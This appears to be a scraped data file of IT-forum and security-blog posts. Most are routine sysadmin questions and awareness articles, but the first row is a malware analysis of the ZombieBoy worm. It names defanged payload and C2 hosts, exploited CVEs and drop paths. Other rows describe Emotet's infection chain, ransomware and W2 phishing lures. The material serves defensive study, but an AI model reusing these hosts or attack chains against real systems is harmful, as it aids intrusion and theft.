2149180,ZombieBoy,"This is a guest post by independent security researcher James Quinn.Continuing the 2018 trend of cryptomining malware, I’ve found another family of mining malware similar to the “massminer” discovered in early May.  I’m calling this family ZombieBoy since it uses a tool called ZombieBoyTools to drop the first dll.ZombieBoy, like MassMiner, is a cryptomining worm that uses some exploits to spread. However, unlike MassMiner, ZombieBoy uses WinEggDrop instead of MassScan to search for new hosts. ZombieBoy is being continually updated, and I’ve been obtaining new samples almost daily.An overview of ZombieBoy’s execution is below:DomainsZombieBoy uses several servers running HFS (http file server) in order to acquire payloads.  The URLs that I have identified are below:ca[dot]posthash[dot]org:443/sm[dot]posthash[dot]org:443/sm[dot]hashnice[dot]org:443/In addition, it appears to have a C2 server at dns[dot]posthash[dot]org.ExploitsZombieBoy makes use of several exploits during execution:CVE-2017-9073, RDP vulnerability on Windows XP and Windows Server 2003CVE-2017-0143, SMB exploitCVE-2017-0146, SMB exploitInstallationZombieBoy first uses the EternalBlue/DoublePulsar exploits to remotely install the main dll. The program used to install the 2 exploits is called ZombieBoyTools and appears to be of chinese origin. It uses Chinese simplified as its language, and has been used to deploy a number of Chinese malware families (such as the IRONTIGER APT version of Gh0stRAT) . ZombieBoyTools screenshotOnce the DoublePulsar exploit is successfully executed, it loads and executes the first Dll of the malware. This downloads 123.exe from ca[dot]posthash[dot]org:443, saves it to “C:\%WindowsDirectory%\sys.exe”, and then executes it.Set up123.exe does several things on execution.  First, it downloads the module [1] from its file distribution servers.  According to code analysis of 123.exe, it refers to this module as “64.exe”, but saves it to the victim as “boy.exe”.   After saving the module, it executes it.  64.exe appears to be in charge of distributing ZombieBoy as well as holding the XMRIG miner.In addition to downloading a module from its servers, 123.exe also drops and executes 2 modules.  The first module is referred to in the code as “74.exe”.  This is saved as “C:\Program Files(x86)\svchost.exe. This appears to be a form of the age-old Gh0stRAT. The second module is referred to in the code as “84.exe”.  This is saved as “C:\Program Files(x86)\StormII\mssta.exe” and appears to be a RAT of unknown origin.64.exe64.exe is the first module downloaded by ZombieBoy. 64.exe uses some anti-analysis techniques that are quite formidable.  First, the entire executable is encrypted with the packer Themida, making reverse-engineering difficult.  Also, in current versions of ZombieBoy, it will detect a VM and subsequently not run. 64.exe drops 70+ files into C:\Windows\IIS that consists of the XMRIG miner, the exploits, as well as a copy of itself that it names CPUInfo.exe. 64.exe obtains the ip of the victim by connecting to ip[dot]3222[dot]net.  It then uses WinEggDrop, a lightweight TCP scanner to scan the network to find more targets with port 445 open.  It uses the IP obtained above as well as...To continue reading, click here",0

My boss wants to run fiber to each building to a small weatherproof switch then power the cameras of POE. The switches in his plan would run back to one of our older buildings that is no the network already and connect into a couple SFP ports on the switch. My boss said he' like to contain the traffic into the one area of the network. We have 2 possibly 3 SFP slots open, the UTP ports are maxed out on a 48PT switch. It sounded like they were thinking going with Alibi cameras, I started looking at Ubiquity for the outdoor capable switch and saw they have cameras too. Another issue is we are running short on I.P addresses, and we would also need a port for the NVR to connect to the network which we don't have. My idea is run the fiber (use media converter if needed) and make both camera arrays a separate LAN and connect direct to the NRV, then if needed just get a copper SFP to add one more port for the NVR so it can be viewed remotely. Part of the thinking I guess with using NVR was it would be simpler to setup and protect the switch than a DVR from weather, damage, etc. If there is some way to do this with analog cameras and dump like 8 feeds over coax into fiber to a DVR that could work too.",0

2170004,Webroot WiFi Security: Expanding Our Commitment to Security & Privacy,"For the past 20 years, Webroot’s technology has been driven by our dedication to protecting users from malware, viruses, and other online threats. The release of Webroot® WiFi Security—a new virtual private network (VPN) app for phones, computers, and tablets—is the next step in fulfilling our commitment to protect everyone’s right to be secure in a connected world.“Launching Webroot WiFi Security is a valuable and exciting progression in our mission,” said Webroot Director of Consumer Product Andy Mallinger. “Antivirus solutions protect your devices from malware and other cyber threats, and a VPN protects your data as it’s sent and received over networks—especially public networks. This combination allows us to extend our protection of personal data beyond the device to the network.”Shifting tidesWebroot WiFi Security arrives at a time when the fragile state of our online privacy is becoming more apparent and better understood by internet users around the world. Recent revelations of government surveillance via the Snowden leaks, social media data collection like that in the Facebook/Cambridge Analytica scandal, and data breaches including the Equifax hack have fueled a palpable rise in data privacy concerns.Over half of internet users from around the world say they are “more concerned about their online privacy than they were a year ago,” according to a 2018 CIGI-Ipsos Global Survey on Internet Security and Trust.Another key factor with grave implications for data privacy in the United States specifically was the 2017 repeal of privacy regulations for Internet Service Providers (ISPs), which aimed to ensure broadband customers had choice, greater transparency, and strong security protections for their personal info collected by ISPs.“ISPs are facing less regulation today, and so can continue to share, sell, and profit by passing on user information to third parties— browser history, location, communications content, financial details, etc.—without the user’s knowledge or consent,” said Webroot Sr. VP of Product Strategy & Technology Alliances Chad Bacher.Taking control of privacyNow more than ever, individual users must take steps to regain control over their online privacy and security. Along with keeping trusted antivirus software installed on mobile and home devices, users should actively protect their data in transit over networks with a VPN.But it’s important to note that all VPN applications are not created equal. Many users looking for a privacy solution find themselves wondering if they can trust that their VPN provider has their interests at heart. Consumer wariness concerning the privacy of VPN products is justified—some VPN apps, especially free ones, are guilty of sharing or selling their user data to third parties, limiting bandwidth, or serving ads. Facebook’s VPN app was recently removed from the Apple App Store® following concerns over the app’s misuse of user data.Webroot WiFi Security provides one of the most powerful forms of encryption available, AES 256-bit encryption, and protects user data from cybercriminals and ISPs alike. Webroot WiFi Security does not collect your browsing activity, the sites you visit, downloaded data (or shared or viewed), DNS queries, or IP addresses. The full Webroot WiFi Security Privacy Statement can be found here.Privacy plus the protection of Web FilteringIn addition to the privacy safeguards of Webroot WiFi Security that protect users while they work, share, bank, and browse online, users also benefit from the integration of Webroot BrightCloud® Threat Intelligence.* The app’s Web Filtering feature provides an extra layer of protection to keep your financial information, passwords, and personal files from being exploited. Webroot WiFi Security is powered by the same threat intelligence platform the world’s leading IT security vendors trust.“Not only is Webroot protecting user privacy, it’s also shielding users from phishing sites and websites associated with malware,” said Malinger.Webroot WiFi Security is compatible with devices running iOS®, Android™, macOS® and Windows® operating systems, and is now available to download on the Apple App Store, Google Play™ store, and Webroot.com.*Only available on Windows, Mac and Android systems",0

1248295,5 Cost Effective Security Program Tips for the SMB,"Often times business owners reach out to the IT department to secure the company.  Technical Security is only a part of the risk and generally the most heavy with products.  This product based approach to security drives the business owner to the thought that security is too expensive.  Organizations can start small and grow towards a mature security program within the organization.  Business owners need to look at Security from a Holistic Approach. Small to midsized organizations are challenged with regulations such as PCI, HIPAA, and Privacy Information Act. They face the same cyber threats as larger corporations but with a tighter budget and already overworked staff.  Below is a list that is cost effective and will get a security program started.  It may seem complicated or overwhelming at first. Like the old adage ""Rome wasn't built in a day"" it takes time to build a security program in a small business but if you don't protect your business remember ""Rome was burned in a day""5 Cheap and Easy Security for the SMBLook beyond your IT person.  Security should be more than a firewall and anti-virus. Security involves several facets:Physical controls e.g. fences, doors, locks and fire extinguishersProcedural controls e.g. incident response processes, management oversight, security awareness and training;Technical controls e.g. user authentication (login) and logical access controls, antivirus software, firewalls;Legal and regulatory or compliance controls e.g. privacy laws, policies and clauses.2.  Train your employees.  Security Awareness can be FREE.  There are lots of resources out there.  Trained staff will stop a problem before it gets too big. 3.  Perform Vulnerability Assessments at a minimum.  There are cheap options out there and if you are need to be PCI compliant often the Acquiring bank will offer a program like Control Scan.  Utilize the tools you have. 4.  Document what you do! Create security policies. The company probably has a shredder and people do shred, yet where is the policy? 5.  Assign responsibility to the security role.  Measure and manage security, create milestones and projects.  Treat this like any other project or decision in your company. Assign it, track it, measure it, put a budget to it. ﻿﻿﻿What are your Top 5?",11
2023430,"Emotet trojan reads your email, uses it to infect more victims","Hi all, we've spotted a new wave of phishing campaigns this week distributing Emotet, a credential-stealing trojan. At first glance they appeared to be fairly run-of-the-mill — the emails are disguised as fake invoice notices and download Word docs booby-trapped with a malicious macro. Not exactly a new threat, right? BUT on further investigation what's interesting is once the trojan lands on a computer, as part of its infection routine it scrapes the victim's Outlook account for sender names and email addresses, then uses that info to blast out more phishing emails from the victim's account. As a result, we're seeing people getting fooled by these emails because they're coming from vendors and other contacts they've actually emailed with in the past. Pretty sneaky. The good news is this is a perfect example of the type of attack Barkly's behavior analysis was built to block. It sees the macro in the Word doc trying to run a PowerShell command to grab the Emotet payload, it recognizes that's malicious behavior, and it shuts it down before the payload can even be downloaded. There are other ways to stop the attack, of course (making sure users either know not to enable macros or can't is another) and the earlier in the infection chain the better. Once Emotet lands on a machine it's designed to spread quickly and make detection and removal a giant pain. The other good news is it looks like many AV vendors and security solutions have started to pick up on this now, too (although that wasn't the case when we first investigated on Wednesday). SHA256 hash: 80d255de0c67759b592c072db8153f84d22f78226e1014720010f49739f7b63fMore details on how the attack works and what the emails look like over at the Barkly blog: https://blog.barkly.com/emotet-trojan-2017-phishing-email-campaignHere's a visual breakdown of the infection chain, too:",11

This has since been removed and sophos installed in it's place.

Trend has not been installed on this machine for some time, although spiceworks reports that it is up-to-date. I don't see how it can think that it is installed and up-to-date when there is no sign off Trend being on the machine at all. I have followed various guides online and deleted some registry entry's left behind.

2172512,Question about Ports and NAT Translations,"Had a situation come up with a customer of ours and it got me thinking..They are using some program for something or another, and that program needs them to have a certain port open to the internet.  It is an internal server that just so happens to also be their DC. Its IP is statically NAT'd to an external IP, and the port is opened on the internal IP.I was concerned that someone could do a port scan on the external IP and see that this random port is open, and try to get in through it. I did my own scan to test it out, and it did not show up! So my question is how does this work? The way I have it worked out in my head is that since the port is only open on the internal IP, and the scan on the external doesn't get NAT'd, it would not show up.  So then I am wondering how does anything get to that external address? Does it just accept any and all connections and then compare them against any rules that have been configured?I would like to get into security before long, so I know I will need to know the basics of how this all works!

1979728,What's on your data breach response checklist in terms of asset management?,"If you’ve experienced a data breach, you’ll of course want to find the source, fix the issue, and execute your data breach response plan if you have one in place. Our recent blog discusses one very important factor following a data breach -- taking a closer examination of your assets. It’s important to know what you’re protecting when avoiding hackers, so whether your company has already experienced a data breach or you just want to prepare, we've compiled a data breach response checklist in our blog that includes some best practices that can help ensure you know what you’re protecting. Our checklist includes: Consider a desktop inventory management tool that catalogues devices on the network, documents the physical configuration, and the software installed on each machine. With a complete inventory, it will be easy to manage software patches and updates that become security weaknesses if not kept up-to-date that leads us too...Complete any patches and updates in a timely manner.If completing a manual inventory, set a schedule, whether it’s monthly or another timeframe that best fits with your business.Assess ports on desktop firewalls, old anti-malware tools, and poor authentication measures.Develop hypotheses after an inventory is conducted to pinpoint where data breaches have occurred or could possibly occur.Conduct interviews with employees, customers, vendors, or any involved parties to help identify weaknesses and the source of the breach.Investigate network access and determine if it has been, or could be compromised. If a compromise has been made, take measures to stop the attack and prevent further data loss.Use single sign on whenever possible to reduce the possibility of human error and leaked passwords.Determine if passwords need to be reset or if accounts need to be locked out.Conduct an access privileges review to include onsite and remote employees, vendors, contractors, and former employees.Create a list of contractors and vendors that use endpoints connected to your network.Update employee training on how to safely use their hardware and software.Implement monitoring on all endpoints with next-generation endpoint protection.Maintain detailed documentation of all steps taken.So SpiceHeads, I want to know - when it comes to avoiding or responding to a data breach, what are the most crucial steps on your checklist? What are the most important steps you take to deal with asset management following a breach? ",0
2178303,"Passwords, MFA, and Best Practices - Oh My","Howdy folks,Need a sanity check here. Right now my company (about 70 users) are on Active Directory, with AD Sync enabled so we utilize Microsoft Azure AD with a number of online services where possible. Everything is going good - but as a good IT guy, always looking at making things better. I'm aware of the NIST's new recommendations on password requirements - and I'm also aware of the in/famous comic of XKCD explaining password entropy. My users have to change their password every 90 days - and I know for a fact (they've openly told me) that some of them just increase numbers in the password or change one character slightly. Which I believe defeats the whole purpose.I'm guessing that if I implement a good MFA solution, *most* of the concerns about weak/lazy passwords that users use will be less of a concern. Problem is - what MFA does everyone recommend? My understanding from earlier forums is that Microsoft's MFA has experienced several outages - which would be no good for us. So I guess in short:Should I leave my users's password requirements as is - 8 characters, one upper, one lower and change every 90 days?If looking to MFA, any recommendations on vendors or solutions? My goal would only trigger an MFA check if it was detected that the user is logging in from a new location - I rather not hear the gnashing of teeth of users having to do it on every login from their office machines. Is utilizing a passphrase 'thisiscrazystuff' better than 'this is crazy stuff'?

Does anyone have experience with third party software that would allow an application to think its running with full privileges, but yet not require the end user to 1) be local admin or 2) call IT and ask for us to authenticate with admin credentials.If you have experience with this software and it works well with your organization, how typically are these types of solutions priced?  Per user, per machine?  I only have 6 users of this application so I don't need to license this software for roughly all 160 employees... just the few that have this specific requirement.",11
607039,Backup Exec 2014 Credentials,I installed a trial version of Backup Exec 2014 onto a Windows 2008 R2 server. I cannot seem to get the credentials changed. Right now it is working on the current domain (I will call Dusty) if I use the Administrator login and password. The problem is going to be that we are going to change our servers to a different domain (I will call Dugan) soon and that network administrator will not be giving me their password. You might say why not just have them put in the password but I want to be able to control the backups and not bother them every time there is a change.They did however give me access to the Dugan's AD server (we moved our users over) which they setup under an special account that I have the login and password. When I run a test on this login in the 'configuration and settings' > 'login accounts' it fails. What do I need to change in my account in order to access the servers through Backup exec 2014. Below is what Dugan's account access I do have.Note that I can have the Dusty's administrator create an account for me in order to test to see if that works. If it does I will just do the same on Dugan.,0

605918,Ransomware hits an admin workstatio​n and kills 7 servers,"Looking for Halloween horror stories? Look no further... This horror story happened to somebody the day before yesterday. This is what happened in their own words:""We are a 250 employee non-profit and we heavily rely on our computer systems in almost everything we do. Yesterday, one of our admin workstations was hit with CryptoWall Version 2.0, and because this workstation had drives mapped to all our servers, and the administrator had permissions, all our seven servers were encrypted and we were dead in the water.CryptoWall took just 55 minutes to encrypt 75 Gigs of information, and it had penetrated most of our network before we found out what was happening, isolate the workstation and get it disconnected from the network. We had backups of the seven servers but it would take days to restore those, so we opted to find out if we could decrypt the files first.Luckily we had just signed up for KnowBe4’s Kevin Mitnick Security Awareness Training, which came with a crypto-ransom guarantee in case something like this would happen. We called them and got instant help with this very urgent problem. They had bitcoins ready in a wallet and were able to pay the $500 ransom within hours. The CryptoWall criminals were actually also pretty quick, and we were issued our decryption key soon after.  We immediately started to decrypt all the files with the provided decryption tool and pulled an all-nighter. It was amazing how long it took to get through all of the data. It finally completed at around 8:30 am. So we estimate about 18 hours of running the decrypt tool on our 75 gigs of data.So far it only appears that one older database file was corrupted during the encryption, but we restored it from our backup and all is fine. I can’t say enough about KnowBe4’s quick response and support with this situation. We dodged a very big bullet here.While only a portion of our staff have completed the training, something tells me more will complete the training requirement after this event. Thank you very much!"" - Q.M.

1948179,"Share Ransomware, Get Free Decryption Key?","Earlier this week, the security researchers from MalwareHunterTeam discovered a newvariant of ransomware that offers its victims a chance at a free decryption key- with a catch. First, victims have to infect two or more other internetusers with the malware, which has been dubbed ""Popcorn Time""(not to be confused with the BitTorrent). Once those victims  paythe ransom, then you'll supposedly get a free decryption key. For those whochoose not to spread the ransomware, there is also the option to pay the 1bitcoin (~770 USD) ransom to get their files decrypted. In order to facilitate this process, users have to refertheir victims to a customized URL found in their Popcorn Time ransom note, Oncethey click the link. they'll be directed to a file located on the ransomware'sTOR server. After that, the victim has 7 days to pay the ransom, or thedecryption key will be deleted and all files will be lost.As an added bonus, ithas also been reported that there is unfinished code in Popcorn Time thatindicates if a user enters the wrong decryption key. If a user enters thewrong key 4 times, the ransomware may start deleting your files.What do you think SpiceHeads - would you be willing toinfect someone else with ransomware in order to save yourself?",1

I work for a newspaper, and yesterday a reporter calls asking if I can open this XML file for him. So I try opening it in a few different programs with no luck. It finally chugs its way open in Notepad+﻿+﻿ when I noticed the header mentioned encryption. This file came as a result of a Freedom of Information Act (FOIA) request made by the reporter and was sent to him by NCIS, so I'm not terribly surprised that it's encrypted. On the one hand because it's the military and on the other because reporters seem to get their hands on the most inconveniently packaged information on a regular basis.My question is, have any of you had to deal with FOIA stuff that may have been encrypted? Or just encrypted XML files in general? Any suggestions on what program I should use to open it? The main problem I think is that the ones I've used so far haven't recognized that the file was encrypted and never prompted for a password, which I have.",0

1155639,What is really happening with Kaspersky and Win 10?,"We are using Kaspersky Endpoint Security (KES) and just renewed for another year, but I already regret it.We are starting to use Windows 10. Actually several developers and testers has done that since last year since we make software and have to make sure it works on Windows 10. When contacting Kaspersky support about getting beta versions KES I was told that it wouldn't be available until Windows 10 was available. And in July they told me that KES would not support Win 10 until October, but if I contacted sales I could get temporary licenses for the consumer product that already does support Win 10 (Kaspersky Internet Security I suppose). Well, not optimal, but it is a workaround and acceptable for a couple of months.I contacted sales, and got assigned a contact person here in Scandinavia that said he would contact me ""later today, or tomorrow"" but then goes silent for a week and does not reply to my repeated mails asking for ETA. Finally I start adding the generic sales email-address to the Cc: field, and gets him to answer. He will get licenses for me. Then nothing happens for another week. I ask for ETA a couple of times, then does the Cc: trick, and he answers that he has ordered but is unable to get licenses from their backoffice (in UK). They have been ordered to not give out keys in all of Europe! I don't get this. We have just renewed our KES licenses and paid it, it is not like we're trying to get something extra for free, and this doesn't cost Kaspersky anything. And -- During this process I also realize that at the same time support tells me that KES will support Win 10 in October, on the blogs Kaspersky are saying that they are working hard with Microsoft in order to have support coming in December!We are being misinformed about when the Win 10 support is coming, and that we can get a workaround that we obviously can't. Maybe I'm imaging things but both the support and sales people seems to be reluctant to answer, like they really don't know what to answer. And when looking at the forum I see threads about this are being locked. Not a good sign...A common excuse for being so late is that businesses usually don't jump on new versions of the OS until long after it has been released, but Win 10 has been tested by us and I assume a lot of other customers since fall of 2014, and I read it is already in use on more than 70 million devices worldwide. The excuse may have worked in the past, but for Win 10 it doesn't. Actually, we are planning to update practically all machines as soon as possible.So what is actually happening with Kaspersky? Is the refusal to give out keys for KIS as a workaround only here in Europe, and what is it about? (Is it the same in US?). Has anyone gone for this workaround and actually gotten keys?﻿ Is this stop due to ""something"" real, whatever that could be, that can or will be solved? Or is it permanent (meaning I will have to find some other AV product to buy for our Win 10 machines).",0

1951287,Download This Hacked App And Die - Literally.,"In the WSJ of Dec 22, 2016 there is an article that hides the real headline. It talks about the research done by CrowdStrike which shows that the DNC hack was done by a hacker group known as Fancy Bear. This group works for the Russian military intelligence agency, known as the GRU, and was one of two Russian hacker outfits that stole emails from the DNC earlier this year.The GRU was involved in the recent war in the Ukraine, and used Fancy Bear for a particulary devious hack. In the Ukrainian operation, CrowdStrike found, the hackers altered a smartphone app that had been developed by a Ukrainian artillery officer to help better aim ordnance. The weaponry used by Ukrainian forces was antiquated, and the app employed GPS to help improve its aim and accuracy.The app was shared widely in online military forums and adopted by many artillery units, the company determined.The Russian hackers, though, turned the app into a kind of homing beacon and could have used it to locate the position of the Ukrainian units, CrowdStrike found.The company discovered no conclusive evidence that the Russian military used the hacked app that way but noted that Ukrainian artillery forces suffered significant losses in combat along the front line.Here is what CrowdStrike concluded: ""For Ukrainian troops, artillery forces have also shouldered a heavy cost. In 2 years of conflict, they have lost nearly 50% of their artillery pieces and over 80% of D-30 howitzers, far more than any other piece of Ukrainian artillery.""“The ability of this malware to retrieve communications and gross locational data from an infected device makes it an attractive way to identify the general location of Ukrainian artillery forces and engage them,” the report said.You can draw your own conclusions, but my point is that these days if you download the wrong app in the wrong situation, it can can get you killed -- literally. I guess that security awareness training in those situations is a life-or-death kind of thing. Glad we are only exposed to hacking in an office environment.",0
666734,password protected CDs," I am the lone IT person for a primary care facility. Recently out Providers and patients have expressed a desire to have their charts (or parts of them) put onto a CD for easy transport to other facilities and/or their personal records.Originally the idea was cheap throwaway USB drives. I quickly quashed that idea as we never know what is on the USB until after it is plugged in.The counter to the USBs, was CDs. Which I agreed would be a good idea. Right now though, I’m unsure how to password protect the CD or file so that only the patient (or someone approved by the patient) can access the files.All of the files would be PDFs; I have the free version of acrobat on my computer, 7-zip, and imgburn.I tried to password protect a test pdf in acrobat, but the “security Method” is unchangeable. That is where adobe says to go to add a password. I’m guessing this is a service that only paid accounts have access to? It’s not expensive, and I’d likely be doing half a dozen patients every week, or someone would…I did try another one called PDFMate, it worked, but it seemed to break the pdf. Even with the correct password, the pdf said the font was not found and I couldn’t see where to change the font to something readable. There was also no setting in PDFmate that could/would change the font, so I don’t’ know what happened in the conversion.I also tried to zip the folder containing the PDF and encrypting the folder, but I get a message saying “recovery policy configured for this system contains invalid recovery certificate.” I am unsure of how to fix this and I don’t know if this will do what I want it to do.So, Here I am. Will it be easier to password protect the CD itself, or the file/folder itself?What can I use to do this? Is there any good reliable free stuff or only paid stuff?Thank you in advance for any guidance offered.",0

1999476,These WannaCry ransomware statistics are bonkers,"Hi all,I know, I know. I get everyone's probably sick of hearing about WannaCry... BUT check out these stats. They're pretty nuts and they drive home a few things for me:Next time there's a majorly publicized leak of exploits stolen from the National Security Agency, folks should probably take notice and patch.Patching is obviously not always simple and easy to do, otherwise this wouldn't have blown up the way it did.We should actually be thanking the WannaCry attackers. They blew the lid off these exploits and the SMB attack vector in a major way that totally screwed it up for the actual professional bad guys — the ones who'd been using it to install credential stealers and more insidious stuff. It's like those guys had been carefully sneaking booze from the parents' liquor cabinet for weeks, filling the bottles back up with water, only to have the WannaCry guys come in, chug, chug, chug, smash some stuff, and throw up on the carpet. Thanks a lot amateurs. Now the liquor cabinet is getting a lock.There are still an insane number of vulnerable systems out there.With more exploits coming, what's really disturbing about all this is how easy it is for anyone with basic technical knowledge to string together an amateurish piece of ransomware, pick up an exploit that's all pre-packaged and ready to go, and then cause some serious global damage. On the bright side, hardly anyone paid the ransom. Pessimistically, that really just means attackers are going to either a) go back to focusing on more silent, insidious stuff; or b) they're going to move on from simple file encryption and start doing something even more painful to get folks to pay.What do you think? Here are the stats:More than 400,000 machines were infected98% of victims were using Windows 7Only 0.07% of victims have paidWannaCry (the ransomware) had initially been discovered 91 days prior to the outbreakThe patch for the exploited SMB vulnerability had been available for 59 days priorETERNALBLUE (the exploit) is just 1 of 18 NSA exploits leaked by the Shadow BrokersOver 1 million computers have port 445 open and exposing SMB to the InternetFor more context on these, head on over to the Barkly blog: https://blog.barkly.com/wannacry-ransomware-statistics-2017What are your thoughts on all this?

Most of these are just attempts to redirect you to online pharmacy websites, but it could just as well be a phising attack to put a keylogger on your system. Below are two screenshots, can you see which is fake and which one is real? This one is good to send to all employees. (Hat Tip to Avira).

427920,5 Network Security Recommendations for 2014,"A new year begins with opportunities to mitigate threats and reduce risk for your company, plus protect your assets. Rather than predicting doom and gloom for IT, here are five security recommendations for 2014 to help IT experts improve their network security. Beyond these suggestions, what else can you recommend for 2014?1. Educate Users – Targeted attacks and social cons profile users to lure them into attack kill chains. Threats using lures of fake surveys, free gifts, fake photos, plus email notifications for shipments, payments and taxes should be understood by all. Continue the educational process with contests for employees to submit possible lures and awarding the best finds. People are curious about attacks and how crimes operate, just look at a weekly TV schedule for an overload of police and detective shows as evidence.2. Remove Java – Reduce your risk profile by removing Java from end user systems. Few, if any, popular websites require it. However, you may find a legacy web application that requires an older version of Java for operation. If this is the case, then use a separate browser that is Java-enabled with specific bookmarks for this web app only. Everyday web browsers for end users should not be Java enabled.3. Back-up Data – Ransomware (e.g. Crytoplocker) is on the rise and cybercriminals are making millions infecting systems and demanding small sums of money to provide the keys to recover data. Payment may or may not recover the data and also marks your organization for a follow-up attack. Regular data back-ups will remove this threat, financial impact, and nuisance to operations.4. Encrypt Customer Data – 2013 had its share of stories about cybercrimes accessing customer data that was stored unencrypted and often within an arms reach from a public facing web server. While your jurisdiction and industry may not have compliance regulations to protect customer data, the impact on your company brand, customer loyalty, revenues and partnerships could be damaging. Unfortunately web services continue to be laden with exploitable vulnerabilities and internally compromised systems are a given. Assuming 100% security to protect unencrypted customer data is a losing bet in 2014.5. Implement Continuous Security Monitoring – In addition to your AV, Firewall and Web Filtering, deploy or employ continuous security monitoring of inventories, software, apps, network devices, exploitable vulnerabilities along side traffic analysis for anomalies and signs of infection. United States, United Kingdom and Australian security experts recommend critical security controls with continuous monitoring to subvert 80-90% of attacks. Security is not an audit, report or one time inspection; continuous security cycles will improve security and lower risk in 2014.Near the top of list we also ranked restricting admin rights from users, moving beyond simple passwords, white listing applications for users and groups, plus providing enterprise apps for data movement between devices. ",0

1215012,Is this strange virus that fights of malware the work of a vigilante?,"A virus that was discovered last year has been attracting more attention recently after studies from Symantec show that it is actively protecting the devices it infects. The odd nature of the virus has led some publications, such as Computerworld, to question whether it is the work of a ""viral vigilante,"" who is working to protect ""routers in the dark alleyways of the Internet from other malware infections."" Originally discovered by an independent researcher in November 2014, the virus, called Linux.Wifatch, targets home routers and Linux-based devices. Linux.Wifatch infects devices over telnet by exploiting insecure passwords. Initially, Linux.Wifatch seems like a run-of-the-mill trojan, creating backdoors in the firmware of a device and sending, as well as receiving, information from an outside source. It appears that the virus protects the devices it infects.﻿But more prying reveals the strange underside of Linux.Wifatch. ""If anyone else, including the device's owner, attempts to connect via telnet,"" Computworld writes, ""they receive the following message: 'Telnet has been closed to avoid further infection of this device. Please disable telnet, change telnet passwords, and/or update the firmware.'"" Stranger still, the author of Linux.Wifatch makes no attempt to hide, or obfuscate, its activities. This led many to initially dismiss it as the work of a novice. The primary function of Linux.Wifatch, Computerworld notes, is to ""communicate via its own peer-to-peer network, using it to distribute updates about other malware threats. [Devices] don't exchange malicious payloads, and in general the code seems designed to harden, or protect, the infected devices.﻿﻿"" Other researchers claim to have discovered Linux.Wifatch as far back as 2013, naming it Reincarna and Zollard, and have confirmed Symantec's report. One additional surprise has led ITpro.co.uk to question whether the virus is a launchpad to call out the US government. Upon debugging the virus' source code, a message appears: ""To any NSA and FBI agents reading this; please consider whether defending the US constitution against all enemies, foreign or domestic, requires you to follow Snowden's example.""﻿While it appears that Linux.Wifatch is making the devices it infects more secure, Symantec warns that ""Wifatch contains a number of general-purpose back doors that can be used by the author to carry out potentially malicious actions.""﻿ Should you find your Linux-based router is infected, Symantec says ""Resetting an infected device will remove the Wifatch malware; however, devices may become infected again over time. If possible, users are advised to keep their device’s software and firmware up-to-date and to change any default passwords that may be in use.﻿""  ",0

463974,Moving SEP Small Business To A New Server Problem,"I am having frustrating problems moving SEPM Small Business Edition from our (soon to be) old server to my new one. I've studied and attempted to follow the steps (solution B) here and it just doesn't seem very clear:http://www.symantec.com/business/support/index?page=content&id=TECH183666For example, when it says: Install the same version of the SEPM you have now on the new machine (1).  Use the procedures described in the Disaster Recovery in order to restore the database that you backed up from the old server, as well as the configuration files. I've installed the same verion but it says use the procedures descrtibed in the Disaster Recovery. SO I do and it says this:Reinstall Symantec Endpoint Protection Manager using a disaster recovery file (gathered in Step 2 above). When the Management Server Configuration Wizard runs, choose ""Custom configuration"" and ""Use a recovery file"". I understand what it says here but I never get the option to choose Custom Configuration and Use Recovery File. So, I am a little confused as to what I need to do here. In addition, I thought I handled this part (it found a recovery file from our current server that I manually copied to the new one) and I tried to restore database (again, copied the backup DB to the new server) and restore says it cannot connect to the database and it never asks me to point to it. Suggestions are really needed as I want to get this step done.Thanks!",0

2101790,Understanding And Preparing For The Upcoming W2 Fraud Attacks,"Having survived the challenges in 2017 I’m sure we’re all looking forward to a bit of a rest, however that is not in our future. It does help to be prepared for what’s coming and that’s why I want to talk a minute about W2 fraud. As we enter the first quarter of 2018, you need to be aware of this, and know how to combat it. What is W2 Fraud?W2 fraud is related to CEO fraud, a.k.a Business Email Compromise (BEC). While CEO fraud happens throughout the year for reasons that will become obvious, W2 Fraud happens primarily in the first quarter here in the US. To put it bluntly, W2 fraud is where somebody pretends to be someone in leadership in an organization and targets someone, usually in HR or payroll and tricks them into sending them the employees tax statements.  This type of attack is almost exclusively done through email phishing, however we can expect to see some cases of the bad guys leveraging a 2nd type of attack, such as SMS phishing (smishing) to improve their odds of success.How does it work?In its most simple form, the attackers will craft an email message with a spoofed (faked) “from” address. This message will request that the victim of the attack send them the W2 tax forms of all employees, usually in a .PDF document.  This message will look legitimate on the surface and may even include the signature block from the sender or other similar traits to make it look legitimate.  There will often be a sense of urgency in the message to get the victim to send the data quickly without giving them a chance to check on the legitimacy.  In addition, more often than not, an attacker is ready to reply almost immediately to any questions posed in an email reply to the initial request.Once the attackers have the tax documents, they almost immediately file tax returns on behalf of the employees.  As you can imagine, these tax returns always result in a refund. Then, when the employee goes to file their taxes they find out that this has already been done for them. This causes a lot of additional work, delays in receiving their actual refunds and the involvement of law-enforcement and the Internal Revenue Service (IRS).  To add insult to injury, the attackers then often sell this information on the dark web. Because it includes sensitive information such as Social Security numbers and salary information, this data is great ammo for identity theft.ExamplesBelow is an example of a real attack that targeted us here at KnowBe4 and a breakdown of ways they try to make this look legitimate. This is a very typical kind of W2 fraud phishing email. As you can see the example above, the focus is on making this look legitimate and getting the person to act very quickly. Here are the different elements broken down.A sense of urgency in the subject. It’s coming from the boss, and they want you to read it as quickly as possible. This sets the tone for the attack and puts the victim on the defensive.Photo of the boss. This was no doubt taken from any of a number of sources on the internet, including LinkedIn, press releases, published articles, etc. and adds to the legitimacy of the email.Email address looks like the real thing. This can be spoofed with a different “reply-to” address or may just be designed to look close if you are not paying attention. For example, this could have easily been stus@knowbe4.xjz.com or something similar. The .xyz in the email address could be easily missed by a victim not trained to look for it.This is also designed to add legitimacy to the message. Many people are not aware that it is easy to discover information like this on the internet. Business tax filings, LinkedIn, press releases, “About Us” webpages, etc. all provide information to allow the attackers to target the right people in the organization.Request for .PDF format. This is the preferred format the attackers request.More urgency. This is once again designed to get the victim to respond quickly, reducing the likeliness they will ask questions or think about the request too much. When the CEO, President or other person in the top leadership makes a request, this often goes unquestioned.Another ExampleThis one is a little less common, however very simple and effective. Essentially, it’s a lead-in to the above example and sets the tone a little stronger. In this case it’s made to appear that the victim missed an earlier email from senior leadership. Once the victim replies to this message saying they did not get an earlier email, the follow up emails would be very similar to the one above however will have a more aggressive tone as they have now made the victim assume they have messed up and missed the initial email request. This puts a lot of pressure on the victim. In a larger organization where employees don’t typically interact with senior leadership, this can put the victim in a very stressful situation and make them unwilling to question the request.  Again, this is an actual email we received here at KnowBe4. Hybrid AttacksI mentioned earlier that we can expect to see times where the attackers leverage other types 